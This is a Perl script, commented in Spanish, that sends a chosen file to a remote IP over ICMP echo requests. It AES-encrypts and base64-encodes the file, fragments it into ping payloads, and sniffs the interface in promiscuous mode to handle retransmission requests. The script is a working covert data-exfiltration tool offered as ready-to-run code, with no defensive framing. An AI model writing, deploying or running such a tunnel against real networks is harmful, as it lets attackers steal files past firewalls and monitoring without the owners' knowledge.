#!/usr/bin/perl
$|=1;						#Buffer en 1 para imprimir sin encolar
use strict;					#Pragma para buenas practicas de programacion
use warnings;
use Net::RawIP;				#Modulo para creacion de paquetes IP
use Net::PcapUtils;			#Modulo para captura de trafico
use NetPacket::Ethernet;	#Modulo para manejo de cabeceras Ethernet
use NetPacket::IP;			#Modulo para manejo de cabeceras IP
use NetPacket::ICMP;		#Modulo para manejo de cabeceras ICMP
use MIME::Base64;			#Modulo de/codificacion en base64
use Net::Address::IP::Local;#Modulo para obtener direccion IP
use Crypt::CBC;

my @missing=();				#Arreglo que almacena los paquetes perdidos
my @packets=();				#Arreglo que almacena los paquetes recibidos
my $message_length;			#Almacena la longitud del mensaje
my $src_ip = Net::Address::IP::Local->public; #Direccion IP del equipo local
my $key=$ARGV[3];
my $dst_ip = $ARGV[2];					#Direccion IP del equipo destino
my $frag_length = $ARGV[1];
my $filename = $ARGV[0];
my $length;
my $missing_packets;		#Paquetes no recibidos
my $cipher = Crypt::CBC->new(-key=> $key,-cipher => 'Rijndael');
my $message=encode_base64($cipher->encrypt(file2bytes($filename)));
$message =~ tr/\n/\*/;
@packets=fragData($message,$frag_length);
$length=$#packets;
my $i=0;
foreach(@packets){
	print $i,"->",$_,"\n";
	$i++;
}
transmision();
checkErrors();
##Transmite la informacion del archivo especificado por $length en paquetes de tamano $frag_length
sub transmision{
        sendICMP("BEGIN--".$length);				#Envia un paquete ICMP con el payload convenido para iniciar la transmision
        foreach (0 .. $length){					#Para cada paquete
                sendICMP("seq.".$_.".".$packets[$_]);	#Envia seq(num)(num)(num) datos fragmentados
        }
        sendICMP("DEADEND");						#Envia un paquete ICMP con el payload convenido para terminar la transmision
}
sub retrans{
	my $missing_packet=shift;
	foreach(@$missing_packets){
		sendICMP("req.".$_.".".$packets[$_]);
		print "Enviando paq ",$_;
#		print("req.".$_.".".$packets[uncesar($_)]."\n");
	}
	sendICMP("DEADEND");
}
##Obtiene $data como argumento y lo envia mediante ICMP
sub sendICMP{
        my $data=shift;						#Obtiene los datos a transmitir
        my $packet = new Net::RawIP ({		#Crea un nuevo objeto RawIP
                ip => {						#Cabecara IP
                        saddr => $src_ip,	#Direccion IP origen
                        daddr => $dst_ip,	#Direccion IP destino
                },
                icmp => {					#Cabecera ICMP
                        type => 8,			#ECHO_REQUEST
                        data => $data,		#Datos a transmitir
                },
        });
        $packet->send();					#Enviar el paquete
}
##Convierte el archivo $file en bytes y lo almacena en $rawbytes
sub file2bytes{
   my $file=shift;
   my $rawbytes;
   open FILE, "<:raw", $file or die "Couldn't open $file!";
   while(<FILE>){
      $rawbytes.=$_;
   }
	close FILE;
   return $rawbytes;
}
##Corta $cadena en fragmentos de tamano $packet_length y los almacena en un arreglo @packets 
sub fragData{
        my ($cadena,$packet_length)= @_;	#Obtener argumentos
        chomp $cadena;						#Eliminar salto de linea
        my @packets = ();					#Nuevo arreglo
        my $substring;						#Auxiliar

        while (length($cadena)!= 0) {		#Mientras longitud diferente de 0
           $substring = substr $cadena, 0, $packet_length;				#Cortar $packet_length caracteres de $cadena
           push(@packets,$substring);									#Insertar la cadena cortada en @packets
           $cadena = substr $cadena, $packet_length, length($cadena);	#Reasignar la cadena
        }
        $packets[$#packets].="."x($packet_length - length $packets[$#packets]);	#Rellenar con "." en caso de que al ultimo paquete le falte
        return @packets;	#Devolver los paquetes
}
sub process_pkt {
	my ($user_data,$hdr,$pkt)=@_;
	my $eth=NetPacket::Ethernet->decode($pkt);				#Decodificar la cabecera Ethernet
	if($eth->{type} == 2048){								#Verificar que sea de tipo IP
		my $ip=NetPacket::IP->decode($eth->{data});			#Decodificar la cabecera IP
		if($ip->{proto} == 1){								#Verificar que sea de tipo ICMP
			my $icmp=NetPacket::ICMP->decode($ip->{data});	#Decodificar la cabecera ICMP
			my $dst_ip=$ip->{src_ip};
			if($icmp->{type} eq 8 and $icmp->{data} =~ /MISP/){	
				print "Solicitud de retrans desde ",$dst_ip,"\n";
				@missing=();				#Reiniciar la captura para evitar capturar diferentes mensajes transmitidos	
				@missing=split(':',$');
				$dst_ip=$ip->{src_ip};		#Obtener direccion IP del equipo que transmite
				foreach(@missing){
      			sendICMP("req.".$_.".".$packets[$_]);
      			print "\nRennviando paq ",$_,"->",$packets[$_];
   			}
   			sendICMP("DEADEND");
			}
			if($icmp->{type} eq 8 and $icmp->{data} =~ /SUCCESS/){
				print "\nSe transmitio el mensaje completo";
				exit(0);
			}	
		}
	}
}
sub checkErrors{
	Net::PcapUtils::loop(\&process_pkt,
   	PROMISC => 1,			#Operar en modo promiscuo
   	NUMPACKETS => -1,		#Paquetes a monitorear (-1 = loop forever)
   	DEV => 'eth0'			#Interfaz de monitoreo
	); #Rutina que captura paquetes IP
}
